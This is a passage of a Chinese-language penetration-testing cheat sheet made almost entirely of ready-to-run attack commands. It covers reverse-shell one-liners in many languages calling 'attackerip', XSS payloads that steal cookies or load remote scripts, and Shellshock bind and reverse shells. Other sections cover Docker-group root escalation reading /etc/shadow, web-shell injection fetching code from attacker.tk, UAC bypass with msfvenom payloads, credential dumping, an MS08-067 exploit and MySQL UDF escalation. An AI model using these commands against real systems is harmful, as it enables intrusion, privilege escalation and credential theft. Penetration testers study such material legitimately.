<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">perl</span> -MIO -e <span class="hljs-string">'<span class="hljs-variable">$p</span>=fork;exit,if(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> while&lt;&gt;;'</span>

<p><span class="hljs-comment"># Win 平台</span><br>perl -MIO -e <span class="hljs-string">‘<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,”attackerip:4444”);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> while&lt;&gt;;’</span><br>perl -e <span class="hljs-string">‘use Socket;<span class="hljs-variable">$i</span>=”10.0.0.1”;<span class="hljs-variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br></span></code></pre></div></p>
<h3><span id="ruby-shell">RUBY 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ruby</span> -rsocket -e 'exit if fork;c=TCPSocket.new(<span class="hljs-string">"attackerip"</span>,<span class="hljs-string">"443"</span>);while(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">"r"</span>){|io|c.print io.read}end'

<p><span class="hljs-comment"># Win 平台</span><br><span class="hljs-attribute">ruby</span> -rsocket -e ‘c=TCPSocket.new(<span class="hljs-string">“attackerip”</span>,<span class="hljs-string">“443”</span>);while(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">“r”</span>){|io|c.print io.read}end’<br><span class="hljs-attribute">ruby</span> -rsocket -e ‘f=TCPSocket.open(<span class="hljs-string">“attackerip”</span>,<span class="hljs-string">“443”</span>).to_i;exec sprintf(<span class="hljs-string">“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”</span>,f,f,f)’<br></code></pre></div></p>
<h3><span id="python-shell-2">PYTHON 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"attackerip"</span>,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-i"</span>]);'
</code></pre></div>
<h3><span id="php-shell">PHP 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">php</span> -r <span class="hljs-string">'<span class="hljs-variable">$sock</span>=fsockopen("attackerip",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre></div>
<h3><span id="java-shell">JAVA 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs python">r = Runtime.getRuntime()
p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] <span class="hljs-keyword">as</span> String[])
p.waitFor()
</code></pre></div>
<h3><span id="netcat-shell">NETCAT 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">nc -e <span class="hljs-meta-keyword">/bin/</span>sh attackerip <span class="hljs-number">4444</span>
nc -e <span class="hljs-meta-keyword">/bin/</span>sh <span class="hljs-number">192.168</span><span class="hljs-number">.37</span><span class="hljs-number">.10</span> <span class="hljs-number">443</span>

<p><span class="hljs-meta"># 如果 -e 参数被禁用，可以尝试以下命令</span><br><span class="hljs-meta"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="hljs-meta-keyword">/bin/</span>sh | nc attackerip <span class="hljs-number">443</span><br>rm -f <span class="hljs-meta-keyword">/tmp/</span>p; mknod <span class="hljs-meta-keyword">/tmp/</span>p p &amp;&amp; nc attackerip <span class="hljs-number">4443</span> <span class="hljs-number">0</span><span class="hljs-meta-keyword">/tmp/</span></p>
<p><span class="hljs-meta"># 如果你安装错了 netcat 的版本，请尝试以下命令</span><br>rm <span class="hljs-meta-keyword">/tmp/</span>f;mkfifo <span class="hljs-meta-keyword">/tmp/</span>f;cat <span class="hljs-meta-keyword">/tmp/</span>f|<span class="hljs-meta-keyword">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>|nc attackerip &gt;<span class="hljs-meta-keyword">/tmp/</span>f<br></code></pre></div></p>
<h3><span id="telnet-shell">TELNET 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># 如果 netcat 不可用或者 /dev/tcp</span>
mknod backpipe p &amp;&amp; telnet attackerip <span class="hljs-number">443</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;backpipe | /bin/bash <span class="hljs-number">1</span>&gt;</span>backpipe
</code></pre></div>
<h3><span id="xterm-shell">XTERM 反弹 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/418628.htm</span></span>
<span class="hljs-meta"># 开启 X 服务器 (:1 – 监听 TCP 端口 6001)</span>
apt-get install xnest
Xnest :<span class="hljs-number">1</span>

<p><span class="hljs-meta"># 记得授权来自目标 IP 的连接</span><br>xterm -display <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1</span></p>
<p><span class="hljs-meta"># 授权访问</span><br>xhost +targetip</p>
<p><span class="hljs-meta"># 在目标机器上连接回我们的 X 服务器</span><br>xterm -display attackerip:<span class="hljs-number">1</span><br><span class="hljs-meta-keyword">/usr/</span>openwin<span class="hljs-meta-keyword">/bin/</span>xterm -display attackerip:<span class="hljs-number">1</span><br>or<br>$ DISPLAY=attackerip:<span class="hljs-number">0</span> xterm<br></code></pre></div></p>
<h3><span id="xss">XSS 备忘录</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs php">https:<span class="hljs-comment">//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span>
(<span class="hljs-string">"&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;"</span>)

<p>&lt;script&gt;document.location=http:<span class="hljs-comment">//IP:PORT&lt;/script&gt;</span></p>
<p><span class="hljs-string">‘;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//“;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;”&gt;’</span>&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(<span class="hljs-number">88</span>,<span class="hljs-number">83</span>,<span class="hljs-number">83</span>))&lt;/SCRIPT&gt;</p>
<p><span class="hljs-string">“;!–”</span>&lt;XSS&gt;=&amp;amp;amp;{()}</p>
<p>&lt;IMG SRC=<span class="hljs-string">“javascript:alert(‘XSS’);”</span>&gt;<br>&lt;IMG SRC=javascript:alert(<span class="hljs-string">‘XSS’</span>)&gt;<br>&lt;IMG <span class="hljs-string">“”</span><span class="hljs-string">“&gt;&lt;SCRIPT&gt;alert(“</span>XSS<span class="hljs-string">“)&lt;/SCRIPT&gt;”</span><span class="hljs-string">“&gt;<br>&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</p>
<p>&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;<br>&lt;IMG SRC=”</span>jav ascript:alert(<span class="hljs-string">‘XSS’</span>);<span class="hljs-string">“&gt;</p>
<p>perl -e ‘print “</span>&lt;IMG SRC=javascript:alert(&lt;span class=”hljs-string”&gt;”XSS&quot;)&gt;”</span>;<span class="hljs-string">‘ &gt; out</p>
<p>&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|]^`=alert(“XSS”)&gt;</p>
<p>(“&gt;&lt; iframes <a href="http://google.com" target="_blank" rel="noopener">http://google.com</a> &lt; iframes &gt;)</p>
<p>&lt;BODY BACKGROUND=”javascript:alert(‘</span>XSS<span class="hljs-string">‘)”&gt;<br>&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘</span>XSS<span class="hljs-string">‘);”&gt;&lt;/FRAMESET&gt;<br>“&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br>%253cscript%253ealert(document.cookie)%253c/script%253e<br>“&gt;&lt;s”%2b”cript&gt;alert(document.cookie)&lt;/script&gt;<br>%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=<a href="http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;" target="_blank" rel="noopener">http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;</a></span>%<span class="hljs-number">3</span>E<br>&lt;img src=asdf onerror=alert(document.cookie)&gt;<br></code></pre></div></p>
<h3><span id="ssh-over-sctp-socat">SSH Over SCTP (使用 Socat)</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 远端服务器</span>
<span class="hljs-comment"># 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP</span>
$ socat SCTP-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">80</span>,fork <span class="hljs-symbol">TCP:</span><span class="hljs-symbol">localhost:</span><span class="hljs-number">22</span>

<p><span class="hljs-comment"># 本地端</span><br><span class="hljs-comment"># 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号</span><br>$ socat TCP-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">1337</span>,fork <span class="hljs-symbol">SCTP:</span><span class="hljs-symbol">SERVER_IP:</span><span class="hljs-number">80</span></p>
<p><span class="hljs-comment"># 创建 socks 代理</span><br><span class="hljs-comment"># 替换 username 和 -p 的端口号</span><br>$ ssh -lusername localhost -D <span class="hljs-number">8080</span> -p <span class="hljs-number">1337</span><br></code></pre></div></p>
<p>使用洋葱网络</p>
<div class="hljs code-wrapper"><pre><code class="hljs sql"># 安装服务
$ apt-get <span class="hljs-keyword">install</span> tor torsocks

<h1 id="绑定-ssh-到-tor-服务端口-80"><a href="#绑定-ssh-到-tor-服务端口-80" class="headerlink" title="绑定 ssh 到 tor 服务端口 80"></a>绑定 ssh 到 tor 服务端口 <span class="hljs-number">80</span></h1><h1 id="etc-tor-torrc"><a href="#etc-tor-torrc" class="headerlink" title="/etc/tor/torrc"></a>/etc/tor/torrc</h1><p>SocksPolicy <span class="hljs-keyword">accept</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>SocksPolicy <span class="hljs-keyword">accept</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">16</span><br><span class="hljs-keyword">Log</span> <span class="hljs-keyword">notice</span> <span class="hljs-keyword">file</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/tor/notices.<span class="hljs-keyword">log</span><br>RunAsDaemon <span class="hljs-number">1</span><br>HiddenServiceDir /<span class="hljs-keyword">var</span>/lib/tor/ssh_hidden_service/<br>HiddenServicePort <span class="hljs-number">80</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">22</span><br>PublishServerDescriptor <span class="hljs-number">0</span><br>$ /etc/init.<span class="hljs-keyword">d</span>/tor <span class="hljs-keyword">start</span><br>$ cat /<span class="hljs-keyword">var</span>/lib/tor/ssh_hidden_service/hostname<br><span class="hljs-number">3</span>l5zstvt1zk5jhl662.onion</p>
<h1 id="ssh-客户端连接"><a href="#ssh-客户端连接" class="headerlink" title="ssh 客户端连接"></a>ssh 客户端连接</h1><p>$ apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> torsocks<br>$ torsocks ssh login@<span class="hljs-number">3</span>l5zstvt1zk5jhl662.onion -<span class="hljs-keyword">p</span> <span class="hljs-number">80</span><br></code></pre></div></p>
<h3><span id="metagoofil-8211">Metagoofil – 元数据收集工具</span></h3>
<p>注：Metagoofil 是一款利用Google收集信息的工具。</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># http://www.edge-security.com/metagoofil.php</span>
<span class="hljs-comment"># 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能</span>
$ python metagoofil.py <span class="hljs-_">-d</span> example.com -t doc,pdf <span class="hljs-_">-l</span> 200 -n 50 -o examplefiles <span class="hljs-_">-f</span> results.html
</code></pre></div>
<h3><span id="-shellshock">利用 Shellshock</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 一个发现并利用服务器 Shellshock 的工具</span>
<span class="hljs-comment"># https://github.com/nccgroup/shocker</span>
$ ./shocker.py -H 192.168.56.118  --command <span class="hljs-string">"/bin/cat /etc/passwd"</span> -c /cgi-bin/status --verbose

<p><span class="hljs-comment"># 查看文件</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-_">-e</span> <span class="hljs-string">“HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo $(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n”</span> | nc 192.168.56.118 80</p>
<p><span class="hljs-comment"># 绑定 shell</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-_">-e</span> <span class="hljs-string">“HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n”</span> | nc 192.168.56.118 80</p>
<p><span class="hljs-comment"># 反弹 Shell</span><br>$ nc <span class="hljs-_">-l</span> -p 443<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">“HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n”</span> | nc 192.168.56.118 80<br></code></pre></div></p>
<h3><span id="-docker-root">获取 Docker 的 Root</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 获取  Docker 的 Root</span>
<span class="hljs-comment"># user 必须在 docker 用户组中</span>
ek@victum<span class="hljs-symbol">:~/docker-test</span>$ id
uid=<span class="hljs-number">1001</span>(ek) gid=<span class="hljs-number">1001</span>(ek) groups=<span class="hljs-number">1001</span>(ek),<span class="hljs-number">114</span>(docker)

<p>ek@victum<span class="hljs-symbol">:<del></span>$ mkdir docker-test<br>ek@victum<span class="hljs-symbol">:</del></span>$ cd docker-test</p>
<p>ek@victum<span class="hljs-symbol">:~</span>$ cat &gt; Dockerfile<br>FROM <span class="hljs-symbol">debian:</span>wheezy</p>
<p>ENV WORKDIR /stuff</p>
<p>RUN mkdir -p $WORKDIR</p>
<p>VOLUME [ $WORKDIR ]</p>
<p>WORKDIR $WORKDIR<br>&lt;&lt; EOF</p>
<p>ek@victum<span class="hljs-symbol">:<del></span>$ docker build -t my-docker-image .<br>ek@victum<span class="hljs-symbol">:</del></span>$ docker run -v $PWD<span class="hljs-symbol">:/stuff</span> -t my-docker-image /bin/sh -c <br><span class="hljs-string">‘cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh’</span><br>./sh<br>whoami<br><span class="hljs-comment"># root</span></p>
<p>ek@victum<span class="hljs-symbol">:~</span>$ docker run -v /<span class="hljs-symbol">etc:</span>/stuff -t my-docker-image /bin/sh -c <span class="hljs-string">‘cat /stuff/shadow’</span><br></code></pre></div></p>
<h3><span id="-dns">使用 DNS 隧道绕过防火墙</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查</span>
<span class="hljs-comment"># dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序</span>

<p><span class="hljs-comment"># 服务器 (攻击者)</span><br>$ apt-get update<br>$ apt-get -y install ruby-dev git make g++<br>$ gem install bundler<br>$ git clone <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/iagox</span>86/dnscat2.git<br>$ cd dnscat2/server<br>$ bundle install<br>$ ruby ./dnscat2.rb<br>dnscat2&gt; New session <span class="hljs-symbol">established:</span> <span class="hljs-number">16059</span><br>dnscat2&gt; session -i <span class="hljs-number">16059</span></p>
<p><span class="hljs-comment"># 客户机 (目标)</span><br><span class="hljs-comment"># <a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a></span><br><span class="hljs-comment"># <a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a></span><br>$ dnscat –host &lt;dnscat server_ip&gt;<br></code></pre></div></p>
<h3><span id="-assemble">编译 Assemble 代码</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">$ nasm -f elf32 simple32.asm -o simple32.o
$ ld -m elf_i386 simple32.o simple32

<p>$ nasm -f elf64 simple.asm -o simple.o<br>$ ld simple.o -o simple<br></code></pre></div></p>
<h3><span id="-shell">使用非交互 Shell 打入内网</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 生成 shell 使用的 ssh 密钥</span>
$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=whoami"</span>
$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "</span>
$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"</span>

<p><span class="hljs-comment"># 增加用户 tempuser </span><br>$ useradd -m tempuser<br>$ mkdir /home/tempuser/.ssh &amp;&amp; chmod <span class="hljs-number">700</span> /home/tempuser/.ssh<br>$ wget -O - -q <span class="hljs-string">“<a href="http://domain.tk/sh.php?cmd=cat" target="_blank" rel="noopener">http://domain.tk/sh.php?cmd=cat</a> /tmp/id_rsa”</span> &gt; <span class="hljs-regexp">/home/tempuser</span><span class="hljs-regexp">/.ssh/authorized</span>_keys<br>$ chmod <span class="hljs-number">700</span> /home/tempuser/.ssh/authorized_keys<br>$ chown -R <span class="hljs-symbol">tempuser:</span>tempuser /home/tempuser/.ssh</p>
<p><span class="hljs-comment"># 反弹 ssh shell</span><br>$ wget -O - -q <span class="hljs-string">“<a href="http://domain.tk/sh.php?cmd=ssh" target="_blank" rel="noopener">http://domain.tk/sh.php?cmd=ssh</a> -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;”</span><br></code></pre></div></p>
<h3><span id="-post-shell">利用 POST 远程命令执行获取 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">attacker</span>:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=<span class="hljs-number">%3</span>Bwhoami&amp;submit=submit' 'http://victum.tk/command.php'

<p><span class="hljs-attribute">attacker</span>:~$ curl -i -s -k  -X ‘POST’ –data-binary $’IP=<span class="hljs-number">%3</span>Becho+<span class="hljs-number">%27</span><span class="hljs-number">%3</span>C<span class="hljs-number">%3</span>Fphp+system<span class="hljs-number">%28</span><span class="hljs-number">%24</span>_GET<span class="hljs-number">%5</span>B<span class="hljs-number">%22</span>cmd<span class="hljs-number">%22</span><span class="hljs-number">%5</span>D<span class="hljs-number">%29</span><span class="hljs-number">%3</span>B+<span class="hljs-number">%3</span>F<span class="hljs-number">%3</span>E<span class="hljs-number">%27</span>+<span class="hljs-number">%3</span>E+..<span class="hljs-number">%2</span>Fshell.php&amp;submit=submit’ ‘<a href="http://victum.tk/command.php&#39;" target="_blank" rel="noopener">http://victum.tk/command.php&#39;</a></p>
<p><span class="hljs-attribute">attacker</span>:~$ curl <a href="http://victum.tk/shell.php?cmd=id" target="_blank" rel="noopener">http://victum.tk/shell.php?cmd=id</a></p>
<p><span class="hljs-comment"># 在服务器上下载 shell (phpshell.php)</span></p>
<p><span class="hljs-attribute">http</span>://victum.tk/shell.php?cmd=php<span class="hljs-number">%20</span>-r<span class="hljs-number">%20</span><span class="hljs-number">%27</span>file_put_contents<span class="hljs-number">%28</span><span class="hljs-number">%22</span>phpshell.php<span class="hljs-number">%22</span>,<span class="hljs-number">%20</span>fopen<span class="hljs-number">%28</span><span class="hljs-number">%22</span><a href="http://attacker.tk/phpshell.txt" target="_blank" rel="noopener">http://attacker.tk/phpshell.txt</a><span class="hljs-number">%22</span>,<span class="hljs-number">%20</span><span class="hljs-number">%27</span>r<span class="hljs-number">%27</span><span class="hljs-number">%29</span><span class="hljs-number">%29</span>;<span class="hljs-number">%27</span></p>
<p><span class="hljs-comment"># 运行 nc 并执行 phpshell.php</span><br><span class="hljs-attribute">attacker</span>:~$ nc -nvlp 1337<br></code></pre></div></p>
<h3><span id="-win7-shell">以管理员身份在 Win7 上反弹具有系统权限的 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">msfvenom –p windows/shell_reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span> –f exe &gt; danger.exe

<p><span class="hljs-comment"># 显示账户配置</span><br>net user &lt;login&gt;</p>
<p><span class="hljs-comment"># Kali 上下载 psexec</span></p>
<p><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/technet.microsoft.com/en</span>-us/sysinternals/bb897553.aspx</p>
<p><span class="hljs-comment"># 使用 powershell 脚本上传 psexec.exe 到目标机器</span><br>echo $client = New-Object System.Net.WebClient &gt; script.ps1<br>echo $targetlocation = <span class="hljs-string">“<a href="http://192.168.56.102/PsExec.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/PsExec.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">“psexec.exe”</span>) <span class="hljs-meta">&gt;&gt; </span>script.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</p>
<p><span class="hljs-comment"># 使用 powershell 脚本上传 danger.exe 到目标机器</span><br>echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br>echo $targetlocation = <span class="hljs-string">“<a href="http://192.168.56.102/danger.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/danger.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script2.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">“danger.exe”</span>) <span class="hljs-meta">&gt;&gt; </span>script2.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</p>
<p><span class="hljs-comment"># 使用预编译的二进制文件绕过 UAC:</span></p>
<p><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/hfiref</span>0x/UACME</p>
<p><span class="hljs-comment"># 使用 powershell 脚本上传 <a href="https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe</a> 到目标机器</span><br>echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br>echo $targetlocation = <span class="hljs-string">“<a href="http://192.168.56.102/Akagi64.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/Akagi64.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script3.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">“Akagi64.exe”</span>) <span class="hljs-meta">&gt;&gt; </span>script3.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</p>
<p><span class="hljs-comment"># 在 Kali 上创建监听</span><br>nc -lvp <span class="hljs-number">4444</span></p>
<p><span class="hljs-comment"># 以系统权限使用 Akagi64 运行 danger.exe </span><br>Akagi64.exe <span class="hljs-number">1</span> <span class="hljs-symbol">C:</span>\Users\User\Desktop\danger.exe</p>
<p><span class="hljs-comment"># 在 Kali 上创建监听</span><br>nc -lvp <span class="hljs-number">4444</span></p>
<p><span class="hljs-comment"># 下一步就会反弹给我们一个提过权的 shell</span><br><span class="hljs-comment"># 以系统权限使用 PsExec 运行 danger.exe </span><br>psexec.exe –i –d –accepteula –s danger.exe<br></code></pre></div></p>
<h3><span id="-win7-shell-2">以普通用户身份在 Win7 上反弹具有系统权限的 Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</span>
<span class="hljs-symbol">
https:</span><span class="hljs-comment">//www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</span>
<span class="hljs-symbol">

<p>https:</span><span class="hljs-comment">//<a href="http://www.exploit-db.com/exploits/37049/" target="_blank" rel="noopener">www.exploit-db.com/exploits/37049/</a></span></p>
<p><span class="hljs-meta"># 查找目标机器是否安装了补丁，输入如下命令</span><br>wmic qfe get<br>wmic qfe | find <span class="hljs-string">“3057191”</span></p>
<p><span class="hljs-meta"># 上传编译后的利用程序并运行它</span><br><span class="hljs-symbol"><br>https:</span><span class="hljs-comment">//github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</span></p>
<p><span class="hljs-meta"># 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe</span><br><span class="hljs-meta"># https:<span class="hljs-comment">//github.com/hfiref0x/CVE-2015-1701 下载它并定位到 “main.c”</span></span></p>
<p><span class="hljs-meta"># 使用 wce.exe 获取已登录用户的明文账号密码</span><br><span class="hljs-symbol"><br>http:</span><span class="hljs-comment">//<a href="http://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="noopener">www.ampliasecurity.com/research/windows-credentials-editor/</a></span></p>
<p>wce -w</p>
<p><span class="hljs-meta"># 使用 pwdump7 获取其他用户的密码哈希值</span><br><span class="hljs-symbol"><br>http:</span><span class="hljs-comment">//<a href="http://www.heise.de/download/pwdump.html" target="_blank" rel="noopener">www.heise.de/download/pwdump.html</a></span></p>
<p><span class="hljs-meta"># we can try online hash cracking tools such crackstation.net</span><br></code></pre></div></p>
<h3><span id="ms08-067-8211-metasploit">MS08-067 – 不使用 Metasploit</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">$ nmap -v -p <span class="hljs-number">139</span>, <span class="hljs-number">445</span> --script=smb-check-vulns --script-args=unsafe=<span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.205</span>
$ searchsploit ms08<span class="hljs-number">-067</span>
$ python <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/exploitdb/</span>platforms<span class="hljs-meta-keyword">/windows/</span>remote/<span class="hljs-number">7132.</span>py <span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.205</span> <span class="hljs-number">1</span>
</code></pre></div>
<h3><span id="-mysql-root">通过 MySQL Root 账户实现提权</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cs"><span class="hljs-meta"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span>
$ wget <span class="hljs-number">0xdeadbeef</span>.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql&gt; use mysql;
mysql&gt; <span class="hljs-function">create table <span class="hljs-title">foo</span>(<span class="hljs-params">line blob</span>)</span>;
mysql&gt; <span class="hljs-function">insert <span class="hljs-keyword">into</span> foo <span class="hljs-title">values</span>(<span class="hljs-params">load_file(<span class="hljs-string">'/home/user/raptor_udf2.so'</span></span>))</span>;
mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">'/usr/lib/mysql/plugin/raptor_udf2.so'</span>;
